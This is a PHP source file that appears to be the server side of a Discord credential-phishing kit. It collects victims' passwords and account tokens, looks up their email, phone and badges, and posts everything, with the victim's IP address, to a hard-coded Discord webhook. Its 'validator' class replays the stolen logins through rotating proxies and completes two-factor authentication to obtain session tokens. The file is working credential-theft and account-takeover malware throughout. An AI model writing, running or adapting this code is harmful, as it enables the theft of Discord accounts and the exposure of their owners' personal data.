<?php
error_reporting(E_ERROR | E_PARSE);
// Just request URL
class Request
{
    public function GetURL($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);
        
        return $data;
    }

    public function PostURL($url, $array)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $array);

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);
        
        return $data;
    }
}

$Request = new Request();


// Monitoring info about users
class Monitoring
{
    public function Status($url)
    {
        // nothing here
    }
}

$Monitoring = new Monitoring();

// Main handler
class Main
{
    public function handler($bot_token, $user_id, $client_ip, $password, $full_url, $login, $server_hostname, $admin_id, $admin_token, $acc_token, $admin_sendlog)
    {
        # Functions #
        function SendMessage($token, $chatID, $messaggio)
        {
            $url   =  "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID . "&text=" . $messaggio . "&disable_web_page_preview=1"; 
            $ch    =  curl_init();
            $optArray = array(
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true
                );
            curl_setopt_array($ch, $optArray);

            $result = curl_exec($ch);

            curl_close($ch);

            return $result;
        }

        function get_random_proxies()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        function getinfo($token, $url){
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

            $result        =  curl_exec($ch);
            $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

            curl_close($ch);

            $body      =  substr($result, $headers_size);
            $response  =  json_decode($body);
            $response  =  json_decode(json_encode($response), true);

            if( isset($response["global"]) )
            {
                $ch = curl_init();
                $proxy = get_random_proxies();

                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
                curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

                $req = curl_exec($ch);

                curl_close($req);

                return $req;
            }
            else
            {
                return $result;
            }
        }

        # MAIN #
        if(stristr($user_id, ','))
        {
            $user_id  =  explode(",", $user_id);
        }
        else
        {
            $user_id  =  array( $user_id );
        }

        $details = json_decode( file_get_contents("https://ipinfo.io/".$client_ip."/json") );
        $country = $details->country;

        if ($country == 'UA')
        { 
            $flag = '🇺🇦'; 
        
        }
        elseif ($country == 'RU')
        { 
            $flag = '🇷🇺'; 
        
        }
        elseif ($country == 'US')
        { 
            $flag = '🇺🇸'; 
        
        }
        else
        { 
            $flag = '🇪🇺'; 
            
        }

        # CHECK BADGES SYSTEM #

        $TeamOwner     =  'Нет';
        $BOT_Verify    =  'Нет';

        $json_response =  json_decode(getinfo($acc_token, "https://discordapp.com/api/v9/users/@me"), true);

        $userid        =  $json_response['id'];

        $login         =  urlencode($login);
        $password      =  urlencode($password);
        $acc_token     =  urlencode($acc_token);

        $howmuchbadges =  0;
        $badges        =  '';

        if(isset($json_response['discriminator']) && isset($json_response['username'])) {
            $public_flags = $json_response['public_flags'];

            $flags = array (
                131072 => 'Verified Developer',
                65536 => 'Verified Bot',
                16384 => 'Bug Hunter Level 2',
                4096 => 'System',
                1024 => 'Team User',
                512 => 'Premium Early Supporter',
                256 => 'Hypesquad Online House 3',
                128 => 'Hypesquad Online House 2',
                64 => 'Hypesquad Online House 1',
                8 => 'Bug Hunter Level 1',
                4 => 'Hypesquad',
                2 => 'Partner',
                1 => 'Staff'
            );

            $str_flags = array();

            while($public_flags != 0)
            {
                foreach($flags as $key => $value)
                {
                    if($public_flags >= $key)
                    {
                        array_push($str_flags,$value);
                        $public_flags = $public_flags - $key;
                    }
                }
            }
        }

        foreach($str_flags as $item)
        {
            if ($item != 'Hypesquad Online House 1' and $item != 'Hypesquad Online House 2' and $item != 'Hypesquad Online House 3')
            {
                if ($item == 'Verified Developer')
                {

                    # CHECK BOTS #
                    $json_response_bot = json_decode(getinfo($usertoken, "https://discord.com/api/v9/applications?with_team_applications=true"), true);

                    foreach($json_response_bot as $item2)
                    {
                        if (json_encode($item2['verification_state']) == '4')
                        {
                            if (json_encode($item2['owner']['id']) == $userid)
                            {
                              $BOT_Verify = 'Bot Owner';
                            }
                        }
                    }

                    # CHECK TEAMS #
                    $json_response_team = json_decode(getinfo($usertoken, "https://discord.com/api/v9/teams"), true);

                    foreach($json_response_team as $item3)
                    {
                        if (json_encode($item3['owner_user_id']) == $userid)
                        {
                            $TeamOwner = 'Team Owner';
                        }
                    }
                    # CHECK TEAMS #

                    if ($TeamOwner != 'Нет' and $BOT_Verify == 'Нет')
                    {
                        $item = (string)$item.'(Team Owner)';
                    }
                    elseif($TeamOwner == 'Нет' and $BOT_Verify != 'Нет')
                    {
                        $item = (string)$item.'(Bot Owner)';
                    }
                    elseif($TeamOwner != 'Нет' and $BOT_Verify != 'Нет')
                    {
                        $item = (string)$item.'(Team Owner, Bot Owner)';
                    }

                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.' | '.$item;
                    }

                    $howmuchbadges += 1;
                }
                else
                {
                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.' | '.$item;
                    }

                    $howmuchbadges += 1;
                }
            }
        }
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://discordapp.com/api/v9/users/@me');
curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$acc_token));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$json = json_decode(curl_exec($ch), true);
$id = $json['id'];
$username = $json['username'];
$avatar = $json['avatar'];
$discriminator = $json['discriminator'];
$email = $json['email'];
$phone = $json['phone'];
$bio = $json['bio'];
if(empty($bio)){
$bio = 'N/A';
}
if(empty($phone)){
$phone = 'N/A';
}
if(!empty($username)){
if (strpos($email, '@')) {
$verified = 'True';
} else {
$verified = 'True';
}
$avatar = "https://cdn.discordapp.com/avatars/$id/$avatar.png?size=1024";
$ip = $_SERVER['REMOTE_ADDR'];
$result = json_encode([
            "username" => 'logs',
            "avatar_url" => 'https://www.pngitem.com/pimgs/m/50-500675_sleep-emoji-transparent-background-hd-png-download.png',
             "content" => '@everyone',
                "embeds" => [
                    [
                        "title" => "$username#$discriminator ($id)",
                        "type" => "rich",
                        "url" => "https://discord.com/users/$id",
                        "color" => hexdec('0000FF'),
                        "thumbnail" => [
                            "url" => $avatar
                        ],
                        "author" => [
                        "name" => 'Made by Sap',
                        "url" => 'https://discord.com/users/822849390674706433'
                        ],
                        "fields" => [
                            [
                                "name" => "**Username:**",
                                "value" => "```$username#$discriminator```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Email:**",
                                "value" => "```$email```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Phone:**",
                                "value" => "```$phone```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Verified:**",
                                "value" => "```$verified```",
                                "inline" => True
                            ],
                            [
                                "name" => "**About Me:**",
                                "value" => "```$bio```",
                                "inline" => True
                            ],
                            [
                                "name" => "**IP Address:**",
                                "value" => "```$ip```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Password:**",
                                "value" => "```$password```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Token:**",
                                "value" => "```$acc_token```",
                                "inline" => False
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://discord.com/api/webhooks/1073753752965746729/8a07jXrLKSw_nCwhX4FzCWplWNUY_dafMJks38VKgL4_ICncc6L6zWXAwbhUk7HjAXST',
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
        $response = curl_exec($ch);
        curl_close($ch);
}
    }
}

$Main = new Main();
$admin_sendlog = True;
$admin_id = 'cum';
$admin_token = 'tits';

// Validator handler
class VLT_API
{
    public function login($payload): array{
        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function login_proxy($payload): array{
        function get_random_proxy()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $proxy = get_random_proxy();

        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function totp_auth($ticket, $mfa_code): string{
        $ch       =  curl_init("https://discord.com/api/v9/auth/mfa/totp");
        $payload  =  array(
            "code" => $mfa_code,
            "gift_code_sku_id" => null,
            "login_source" => null,
            "ticket" => $ticket
        );
        $payload_s = json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  (array)json_decode($body);

        if( !isset($response["token"]) )
        {
            return "EINVALID_MFA_CODE";
        }
        else
        {
            return $response["token"];
        }
    }
}

$VLT_API = new VLT_API();

?>